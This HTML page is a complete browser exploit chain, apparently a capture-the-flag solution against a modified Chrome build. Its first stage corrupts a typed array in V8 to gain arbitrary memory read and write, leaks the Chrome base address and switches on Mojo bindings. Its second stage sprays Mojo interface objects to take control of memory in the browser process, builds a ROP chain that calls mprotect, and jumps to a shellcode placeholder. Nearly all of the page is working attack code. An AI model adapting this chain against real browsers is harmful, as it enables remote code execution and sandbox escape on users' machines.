<html>
<script src="./mojo/mojo_bindings.js"></script>
<script src="./mojo/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"></script>
<pre id='log'></pre>
<script>
    function print(string) {
        var log = document.getElementById('log');
        if (log) {
            log.innerText += string + '\n';
        }
    }
    function hex(i) {
        start = "";
        content = i.toString(16);
        if (i < 0) {
            start += "-";
            content = content.substring(1);
        }
        return start + "0x" + content;
    }

</script>
<script type="text/javascript">
    function pwn_v8() {
        print("In v8");
        const uint32 = new Uint32Array([0x1000]);
        oob_access_array = [uint32];
        var f64 = new Float64Array([1.1]);
        uint32.set(uint32, 9);

        var buf = new ArrayBuffer(8);
        var f64_buf = new Float64Array(buf);
        var u64_buf = new Uint32Array(buf);

        function ftoi(val) {
            f64_buf[0] = val;
            return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
        }

        function itof(val) {
            u64_buf[0] = Number(val & 0xffffffffn);
            u64_buf[1] = Number(val >> 32n);
            return f64_buf[0];
        }

        function addrof(in_obj) {
            oob_access_array[0] = in_obj;
            return uint32[0x15];
        }
        function fakeobj(addr) {
            uint32[0x15] = addr;
            return oob_access_array[0];
        }

        var float_array_map = uint32[62];
        if (float_array_map == 0x3ff19999)
            float_array_map = uint32[63];

        var arr2 = [itof(BigInt(float_array_map)), itof(0n), itof(8n), itof(1n), itof(0x1234n), 0, 0].slice();
        var fake = fakeobj(addrof(arr2) - 0x38);
        var v8_heap = BigInt(uint32[12]) << 32n;

        function arbread(addr) {
            arr2[5] = itof(addr);
            return ftoi(fake[0]);
        }

        function arbwrite(addr, val) {
            arr2[5] = itof(addr);
            fake[0] = itof(val);
        }
        var leak = BigInt(addrof(window)) + 0x10n + v8_heap - 1n;
        var chrome_base = arbread(leak) - 0xc1ce730n;
        var mojo_enabled = chrome_base + 0xc560f0en;
        localStorage.setItem("chrome_base", chrome_base);
        arbwrite(mojo_enabled, 1n);
        window.location.reload();
    }



</script>
<script type="text/javascript">
    arb = new ArrayBuffer(8);
    f64 = new Float64Array(arb);
    B64 = new BigInt64Array(arb);

    function ftoi(f) {
        f64[0] = f;
        return B64[0];
    }

    function itof(i) {
        B64[0] = i;
        return f64[0];
    }

    function pwn_sbx() {
        print('In sbx!');
        (async function pwn() {
            A = [];
            B = [];
            let i = 0;
            for (i = 0; i < 0x1000; i++) {
                A.push(null);
                A[i] = new blink.mojom.CtfInterfacePtr();
                Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(A[i]).handle);
            }
            for (i = 0; i < 0x1000; i++) {
                A[i].ptr.reset();
            }
            for (i = 0; i < 0x1000; i++) {
                B.push(null);
                B[i] = new blink.mojom.CtfInterfacePtr();
                Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(B[i]).handle);
                B[i].resizeVector(0x4);
            }
            for (i = 0; i < 0x1000; i++) {
                await B[i].write(itof(BigInt(i)), 0);
            }

            var vtable = (await B[0].read(4)).value;
            var heap1 = (await B[0].read(5)).value;
            var heap2 = (await B[0].read(6)).value;

            vtable = ftoi(vtable);
            heap1 = ftoi(heap1);
            heap2 = ftoi(heap2);
            if ((heap1 + 0x20n == heap2) && ((vtable & 0xfffn) == 0x4e0n)) { // pass check !
                print("OK!");
                print(hex(vtable));
                print(hex(heap1));
                print(hex(heap2));
            } else { // failed !
                window.location.reload();
            }

            // Now B[0] can control B[2]'s data pointer by setting B[0].Write(xxx, 5)
            async function aaw(address, value) {
                await B[0].write(itof(address), 5);
                await B[2].write(itof(value), 0);
            }

            async function aar(address) {
                await B[0].write(itof(address), 5);
                var v = (await B[2].read(0)).value;
                return ftoi(v);
            }

            //var chrome_base = BigInt(localStorage.getItem("chrome_base")); // NOT WORKING @_@?
            var chrome_base = vtable - 0xbc774e0n; // get chrome base address
            var chrome_base_rop = chrome_base + 0x33c9000n; // chrome base for ROP gadget 
            xchg_rax_rsp = chrome_base_rop + 0x8f0e18n; // xchg rax, rsp; add cl, byte ptr [rax - 0x77]; ret;
            pop1 = chrome_base_rop + 0x29ddebn; // pop r12; ret
            pop_rax = chrome_base_rop + 0x50404n; //pop rax; ret;
            pop_rsi = chrome_base_rop + 0xc5daen; // pop rsi; ret;
            pop_rdx = chrome_base_rop + 0x28c332n;// pop rdx; ret; 
            pop_rdi = chrome_base_rop + 0x20b45dn;//  pop rdi; ret; 
            syscall_ret = chrome_base + 0x800dd77n; // syscall; ret;
            jmp_rax = chrome_base_rop + 0xbcfn; // jmp rax;

            /* Our ROP chain */
            await B[2].write(itof(pop1), 0); // ROP will start from here
            await B[2].write(itof(xchg_rax_rsp), 1); // vtable will jump to here
            await B[2].write(itof(pop_rax), 2); // pop rax
            await B[2].write(itof(10n), 3); // rax = 10 ( mprotect's syscall number )
            await B[2].write(itof(pop_rdx), 4); // pop rdx
            await B[2].write(itof(7n), 5); // rdx = 7 ( PROT = rwx )
            await B[2].write(itof(pop_rsi), 6); // pop rsi
            await B[2].write(itof(0x2000n), 7); // rsi = 0x2000
            await B[2].write(itof(pop_rdi), 8); // pop rdi
            await B[2].write(itof((heap1 & (~0xfffn))), 9); // rdi = heap1 & (~0xfff)
            await B[2].write(itof(syscall_ret), 10); // do syscall ( mprotect(heap1 & ~0xfff, 0x2000, 7) )
            await B[2].write(itof(pop_rax), 11); // pop rax
            await B[2].write(itof(heap1 + 0x100n), 12); // rax = heap1 + 0x100
            await B[2].write(itof(jmp_rax), 13); // jmp to RAX ( B[2] index 32, our shellcode )

            /* Our shellcode */
            //await B[2].write(itof(0xfeebn), 32); // loop
            //await B[2].write(itof(shellcode in BigInt), 33); 
            //await B[2].write(itof(shellcode in BigInt), 34); 
            //.............. 
BILLY_SHELLCODE
	    /* Change B[2]'s vtable and trigger destructor, jump to our ROP chain*/
            await B[0].write(itof(heap1), 4); // change B[2]'s vtable
            await B[2].ptr.reset(); // call [rax+8] == xchg rax, rsp

            print("Done"); // Should never reach here
        })();
    }

</script>
<script>
    if (typeof (Mojo) !== "undefined") {
        // Mojo JS enabled, attack sandbox
        //var chrome_base = BigInt(localStorage.getItem("chrome_base"));
        //print("Chrome base: "+hex(chrome_base));
        pwn_sbx();
    } else {
        // Mojo JS not enabled, enable first
        pwn_v8();
    }
</script>

</html>

